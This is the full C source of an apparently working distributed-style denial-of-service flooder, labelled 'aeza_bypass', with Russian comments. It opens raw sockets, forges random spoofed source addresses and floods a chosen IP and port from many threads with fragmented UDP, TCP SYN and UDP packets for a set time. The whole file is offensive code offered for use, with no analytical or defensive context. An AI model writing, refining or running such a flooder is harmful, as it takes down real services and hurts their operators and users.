#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 1024
#define FRAGMENT_SIZE 512
#define MAX_FRAGMENTS 20

// структура для потока
typedef struct {
    int thread_id;
    char *target_ip;
    int target_port;
    int duration;
    int packets_sent;
} thread_data_t;

// глобальные переменные
volatile int running = 1;
int total_packets = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// обработчик сигналов
void signal_handler(int sig) {
    running = 0;
    printf("\nостановка атаки...\n");
}

// вычисление контрольной суммы IP
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// создание IP заголовка с фрагментацией
void create_ip_header(struct iphdr *ip, char *src_ip, char *dst_ip, int fragment_id, int offset, int more_frags) {
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + FRAGMENT_SIZE);
    ip->id = htons(fragment_id);
    ip->frag_off = htons((offset >> 3) | (more_frags ? 0x2000 : 0));
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    inet_pton(AF_INET, src_ip, &ip->saddr);
    inet_pton(AF_INET, dst_ip, &ip->daddr);
    ip->check = checksum((unsigned short*)ip, sizeof(struct iphdr));
}

// создание UDP заголовка
void create_udp_header(struct udphdr *udp, int src_port, int dst_port, int len) {
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + len);
    udp->check = 0;
}

// генерация случайного IP
void generate_random_ip(char *ip_str) {
    sprintf(ip_str, "%d.%d.%d.%d", 
            rand() % 255 + 1, rand() % 255 + 1, 
            rand() % 255 + 1, rand() % 255 + 1);
}

// создание фрагментированного пакета
int create_fragmented_packet(char *packet, char *src_ip, char *dst_ip, int dst_port, int fragment_id) {
    struct iphdr *ip = (struct iphdr*)packet;
    struct udphdr *udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    int src_port = rand() % 65535 + 1024;
    int offset = 0;
    int more_frags = 1;
    
    // создаем IP заголовок с фрагментацией
    create_ip_header(ip, src_ip, dst_ip, fragment_id, offset, more_frags);
    
    // создаем UDP заголовок
    create_udp_header(udp, src_port, dst_port, FRAGMENT_SIZE);
    
    // заполняем данные случайными байтами
    for (int i = 0; i < FRAGMENT_SIZE; i++) {
        data[i] = rand() % 256;
    }
    
    return sizeof(struct iphdr) + sizeof(struct udphdr) + FRAGMENT_SIZE;
}

// создание TCP SYN пакета
int create_tcp_syn_packet(char *packet, char *src_ip, char *dst_ip, int dst_port) {
    struct iphdr *ip = (struct iphdr*)packet;
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    int src_port = rand() % 65535 + 1024;
    
    // IP заголовок
    create_ip_header(ip, src_ip, dst_ip, rand() % 65536, 0, 0);
    ip->protocol = IPPROTO_TCP;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    
    // TCP заголовок
    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(rand());
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    // вычисляем TCP checksum
    struct pseudo_header {
        unsigned int src_addr;
        unsigned int dst_addr;
        unsigned char zero;
        unsigned char protocol;
        unsigned short tcp_len;
    } psh;
    
    psh.src_addr = ip->saddr;
    psh.dst_addr = ip->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len = htons(sizeof(struct tcphdr));
    
    char *tcp_with_psh = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr));
    memcpy(tcp_with_psh, &psh, sizeof(struct pseudo_header));
    memcpy(tcp_with_psh + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
    
    tcp->check = checksum((unsigned short*)tcp_with_psh, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
    free(tcp_with_psh);
    
    return sizeof(struct iphdr) + sizeof(struct tcphdr);
}

// создание UDP flood пакета
int create_udp_flood_packet(char *packet, char *src_ip, char *dst_ip, int dst_port) {
    struct iphdr *ip = (struct iphdr*)packet;
    struct udphdr *udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    int src_port = rand() % 65535 + 1024;
    int data_size = rand() % 1000 + 100;
    
    // IP заголовок
    create_ip_header(ip, src_ip, dst_ip, rand() % 65536, 0, 0);
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_size);
    
    // UDP заголовок
    create_udp_header(udp, src_port, dst_port, data_size);
    
    // случайные данные
    for (int i = 0; i < data_size; i++) {
        data[i] = rand() % 256;
    }
    
    return sizeof(struct iphdr) + sizeof(struct udphdr) + data_size;
}

// поток атаки
void* attack_thread(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return NULL;
    }
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &dest_addr.sin_addr);
    
    char packet[PACKET_SIZE];
    char src_ip[16];
    int packets_sent = 0;
    time_t start_time = time(NULL);
    
    printf("поток %d: запуск атаки на %s:%d\n", data->thread_id, data->target_ip, data->target_port);
    
    while (running && (time(NULL) - start_time) < data->duration) {
        // случайный тип атаки
        int attack_type = rand() % 3;
        
        generate_random_ip(src_ip);
        
        int packet_size = 0;
        
        switch (attack_type) {
            case 0: // фрагментированные пакеты
                packet_size = create_fragmented_packet(packet, src_ip, data->target_ip, data->target_port, rand() % 65536);
                break;
            case 1: // TCP SYN flood
                packet_size = create_tcp_syn_packet(packet, src_ip, data->target_ip, data->target_port);
                break;
            case 2: // UDP flood
                packet_size = create_udp_flood_packet(packet, src_ip, data->target_ip, data->target_port);
                break;
        }
        
        // отправка пакета
        if (sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) > 0) {
            packets_sent++;
            total_packets++;
        }
        
        // микро-задержка
        usleep(rand() % 1000 + 100);
    }
    
    pthread_mutex_lock(&stats_mutex);
    printf("поток %d: отправлено %d пакетов\n", data->thread_id, packets_sent);
    pthread_mutex_unlock(&stats_mutex);
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("использование: %s <target_ip> <target_port> <duration> <threads>\n", argv[0]);
        printf("пример: %s 192.168.1.1 80 60 100\n", argv[0]);
        exit(1);
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (threads > MAX_THREADS) {
        printf("максимум %d потоков\n", MAX_THREADS);
        exit(1);
    }
    
    // проверка прав root
    if (getuid() != 0) {
        printf("требуются права root для raw sockets\n");
        exit(1);
    }
    
    printf("aeza_bypass: запуск L3/L4 атаки на %s:%d\n", target_ip, target_port);
    printf("потоков: %d, время: %d сек\n", threads, duration);
    printf("типы атак: фрагментация, TCP SYN, UDP flood\n");
    
    // обработчик сигналов
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // инициализация рандома
    srand(time(NULL));
    
    // создание потоков
    pthread_t thread_ids[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];
    
    for (int i = 0; i < threads; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].target_ip = target_ip;
        thread_data[i].target_port = target_port;
        thread_data[i].duration = duration;
        thread_data[i].packets_sent = 0;
        
        if (pthread_create(&thread_ids[i], NULL, attack_thread, &thread_data[i]) != 0) {
            perror("pthread_create");
            exit(1);
        }
    }
    
    // ожидание завершения
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    printf("атака завершена. всего пакетов: %d\n", total_packets);
    
    return 0;
}
